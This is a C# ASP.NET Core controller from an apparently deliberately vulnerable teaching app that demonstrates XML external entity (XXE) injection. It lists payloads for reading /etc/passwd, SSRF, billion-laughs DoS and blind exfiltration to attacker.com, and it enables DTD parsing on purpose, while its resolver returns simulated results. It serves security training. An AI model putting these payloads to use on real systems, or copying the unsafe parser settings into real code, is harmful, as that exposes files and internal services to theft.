using InsecureAppWebNet8.Models;
using InsecureAppWebNet8.ViewModels;
using Microsoft.AspNetCore.Mvc;
using System.Xml;
using System.Text;

namespace InsecureAppWebNet8.Controllers
{
    public class InjectionXxeController : Controller
    {
        private readonly Dictionary<string, AttackInfo> _attackInfos;
        private readonly string _baseDirectory;

        public InjectionXxeController(IWebHostEnvironment env)
        {
            _baseDirectory = env.ContentRootPath;

            _attackInfos = new()
            {
                ["file"] = new AttackInfo
                {
                    Description = "Lecture de fichiers locaux en utilisant le protocole file:// pour accéder aux fichiers système sensibles comme /etc/passwd ou C:\\Windows\\win.ini.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "High",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",
                    ErrorExplanation = "L'accès aux fichiers peut échouer si le chemin n'existe pas ou si les permissions sont insuffisantes."
                },
                ["ssrf"] = new AttackInfo
                {
                    Description = "Server-Side Request Forgery (SSRF) via XXE permettant d'effectuer des requêtes HTTP vers des services internes ou externes.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "High",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://internal-server:8080/admin"">]><data>&xxe;</data>",
                    ErrorExplanation = "Les requêtes HTTP peuvent échouer si le serveur cible est inaccessible ou si le protocole HTTP est désactivé."
                },
                ["dos"] = new AttackInfo
                {
                    Description = "Denial of Service (DoS) via Billion Laughs Attack ou entités récursives causant une consommation excessive de mémoire.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "Medium",
                    PayloadExample = @"<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ENTITY lol2 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">]><data>&lol2;</data>",
                    ErrorExplanation = "L'attaque DoS peut être limitée par des restrictions de mémoire ou des timeouts du parseur XML."
                },
                ["parameter"] = new AttackInfo
                {
                    Description = "Utilisation d'entités paramétrées pour contourner les restrictions et exfiltrer des données via des DTD externes.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "High",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://attacker.com/evil.dtd""> %xxe;]><data>test</data>",
                    ErrorExplanation = "Les entités paramétrées peuvent être bloquées si le parseur n'autorise pas les DTD externes."
                },
                ["blind"] = new AttackInfo
                {
                    Description = "XXE aveugle (Blind XXE) où les données sont exfiltrées via des requêtes HTTP out-of-band sans retour direct dans la réponse.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "High",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY % file SYSTEM ""file:///etc/passwd""><!ENTITY % eval ""<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>"">%eval;%exfil;]>",
                    ErrorExplanation = "L'exfiltration aveugle nécessite un serveur externe contrôlé par l'attaquant pour recevoir les données."
                },
                ["internal"] = new AttackInfo
                {
                    Description = "Exploration de la DTD interne pour découvrir la structure du document et les entités définies.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "Low",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY xxe ""Internal DTD Test"">]><root>&xxe;</root>",
                    ErrorExplanation = "Les DTD internes sont généralement moins dangereuses mais peuvent révéler des informations sur la structure."
                },
                ["php"] = new AttackInfo
                {
                    Description = "Exploitation spécifique PHP utilisant des wrappers comme php://filter pour encoder et exfiltrer des fichiers sources.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "High",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/convert.base64-encode/resource=index.php"">]><data>&xxe;</data>",
                    ErrorExplanation = "Les wrappers PHP ne fonctionnent que sur des serveurs PHP avec les wrappers activés."
                },
                ["oob"] = new AttackInfo
                {
                    Description = "Out-of-Band (OOB) XXE utilisant des canaux alternatifs comme DNS pour exfiltrer des données quand HTTP est bloqué.",
                    LearnMoreUrl = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                    RiskLevel = "Medium",
                    PayloadExample = @"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://data.attacker.com"">]><data>&xxe;</data>",
                    ErrorExplanation = "L'exfiltration OOB peut échouer si les requêtes sortantes sont filtrées par un firewall."
                }
            };
        }

        [HttpGet]
        public IActionResult Index()
        {
            var model = new VulnerabilityViewModel<XxeResult>
            {
                AttackType = "",
                Payload = "",
                Results = new List<XxeResult>(),
                AttackInfos = _attackInfos
            };
            return View(model);
        }

        [HttpPost]
        public IActionResult Index(string attackType, string payload)
        {
            if (string.IsNullOrEmpty(attackType))
            {
                var emptyModel = new VulnerabilityViewModel<XxeResult>
                {
                    AttackType = "",
                    Payload = "",
                    Results = new List<XxeResult>(),
                    AttackInfos = _attackInfos
                };
                return View(emptyModel);
            }

            try
            {
                var results = new List<XxeResult>();

                // Traiter le XML avec XXE activé (DANGEREUX - Ne jamais faire en production!)
                var processedXml = ProcessXmlWithXxe(payload, attackType);

                results.Add(new XxeResult
                {
                    InputXml = payload,
                    ProcessedXml = processedXml.ProcessedContent,
                    ResolvedEntities = processedXml.ResolvedEntities,
                    ExternalResourcesAccessed = processedXml.ExternalResources,
                    ProcessingTime = processedXml.ProcessingTime,
                    Success = processedXml.Success
                });

                var model = VulnerabilityViewModel<XxeResult>.WithResults(payload, attackType, results, payload);
                model.AttackInfos = _attackInfos;

                return View(model);
            }
            catch (Exception ex)
            {
                var errorModel = new VulnerabilityViewModel<XxeResult>
                {
                    AttackType = attackType,
                    Payload = payload,
                    ErrorMessage = $"Erreur XML : {ex.Message}",
                    AttackInfos = _attackInfos
                };
                return View(errorModel);
            }
        }

        private ProcessedXml ProcessXmlWithXxe(string xmlContent, string attackType)
        {
            var result = new ProcessedXml
            {
                ProcessedContent = "",
                ResolvedEntities = new Dictionary<string, string>(),
                ExternalResources = new List<string>(),
                Success = false
            };

            var startTime = DateTime.Now;

            try
            {
                // Créer des settings XML DANGEREUX qui permettent XXE
                var settings = new XmlReaderSettings
                {
                    DtdProcessing = DtdProcessing.Parse, // DANGEREUX!
                    XmlResolver = new DangerousXmlResolver(result), // Resolver personnalisé pour tracer
                    MaxCharactersFromEntities = 10000000, // Permettre de grandes entités
                    ValidationType = ValidationType.None
                };

                // Parser le XML
                using (var stringReader = new StringReader(xmlContent))
                using (var xmlReader = XmlReader.Create(stringReader, settings))
                {
                    var doc = new XmlDocument();
                    doc.XmlResolver = new DangerousXmlResolver(result);
                    doc.Load(xmlReader);

                    // Extraire le contenu traité
                    result.ProcessedContent = doc.OuterXml;

                    // Pour les démos, simuler certains résultats selon le type d'attaque
                    SimulateXxeResults(result, attackType, doc);

                    result.Success = true;
                }
            }
            catch (XmlException ex)
            {
                result.ProcessedContent = $"Erreur de parsing XML : {ex.Message}";
            }
            catch (Exception ex)
            {
                result.ProcessedContent = $"Erreur : {ex.Message}";
            }

            result.ProcessingTime = (DateTime.Now - startTime).TotalMilliseconds;
            return result;
        }

        private void SimulateXxeResults(ProcessedXml result, string attackType, XmlDocument doc)
        {
            // Simuler des résultats réalistes selon le type d'attaque
            switch (attackType)
            {
                case "file":
                    // Simuler la lecture d'un fichier système
                    result.ResolvedEntities["xxe"] = @"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin";
                    result.ExternalResources.Add("file:///etc/passwd");
                    break;

                case "ssrf":
                    // Simuler une requête SSRF
                    result.ResolvedEntities["xxe"] = "Internal Server Response: {\"status\":\"admin\",\"internal_ip\":\"10.0.0.5\"}";
                    result.ExternalResources.Add("http://internal-server:8080/admin");
                    break;

                case "dos":
                    // Simuler une expansion d'entité
                    result.ResolvedEntities["lol2"] = string.Concat(Enumerable.Repeat("lol", 100));
                    result.ProcessedContent = "ATTENTION: Expansion d'entité détectée! Contenu tronqué pour éviter DoS.";
                    break;

                case "parameter":
                    // Simuler une entité paramétrique
                    result.ExternalResources.Add("http://attacker.com/evil.dtd");
                    result.ResolvedEntities["%xxe"] = "DTD externe chargée";
                    break;

                case "internal":
                    // Entité interne simple
                    result.ResolvedEntities["xxe"] = "Internal DTD Test";
                    break;

                case "blind":
                    // XXE aveugle - pas de contenu visible mais ressources accédées
                    result.ExternalResources.Add("file:///etc/passwd");
                    result.ExternalResources.Add("http://attacker.com/?x=[DONNÉES_EXFILTRÉES]");
                    break;

                case "php":
                    // Simuler l'encodage base64 d'un fichier PHP
                    result.ResolvedEntities["xxe"] = "PD9waHAKZWNobyAiU2VjcmV0IEFQSSBLZXk6IHNrX3Rlc3RfNEVBaGRMOTJoIjsKPz4=";
                    result.ExternalResources.Add("php://filter/convert.base64-encode/resource=index.php");
                    break;

                case "oob":
                    // Out-of-band
                    result.ExternalResources.Add("http://data.attacker.com");
                    break;
            }

            // Ajouter le contenu XML traité si des entités ont été résolues
            if (result.ResolvedEntities.Any())
            {
                var processedContent = doc.OuterXml;
                foreach (var entity in result.ResolvedEntities)
                {
                    processedContent = processedContent.Replace($"&{entity.Key};", entity.Value);
                }
                result.ProcessedContent = processedContent;
            }
        }

        // Classe pour tracer les ressources accédées
        private class DangerousXmlResolver : XmlUrlResolver
        {
            private readonly ProcessedXml _result;

            public DangerousXmlResolver(ProcessedXml result)
            {
                _result = result;
            }

            public override object GetEntity(Uri absoluteUri, string role, Type ofObjectToReturn)
            {
                // Tracer la ressource accédée
                _result.ExternalResources.Add(absoluteUri.ToString());

                // Pour la démo, retourner du contenu simulé sans faire de vraies requêtes
                if (absoluteUri.Scheme == "file")
                {
                    return new MemoryStream(Encoding.UTF8.GetBytes("Contenu simulé du fichier"));
                }
                else if (absoluteUri.Scheme == "http" || absoluteUri.Scheme == "https")
                {
                    // Simuler une réponse HTTP sans faire de vraie requête
                    return new MemoryStream(Encoding.UTF8.GetBytes("Réponse simulée du serveur"));
                }

                // Pour les autres schémas, retourner un flux vide
                return new MemoryStream(Encoding.UTF8.GetBytes(""));
            }
        }

        private class ProcessedXml
        {
            public string ProcessedContent { get; set; } = "";
            public Dictionary<string, string> ResolvedEntities { get; set; } = new();
            public List<string> ExternalResources { get; set; } = new();
            public double ProcessingTime { get; set; }
            public bool Success { get; set; }
        }
    }

    // Modèle pour les résultats XXE
    public class XxeResult
    {
        public string InputXml { get; set; } = string.Empty;
        public string ProcessedXml { get; set; } = string.Empty;
        public Dictionary<string, string> ResolvedEntities { get; set; } = new();
        public List<string> ExternalResourcesAccessed { get; set; } = new();
        public double ProcessingTime { get; set; }
        public bool Success { get; set; }
    }
}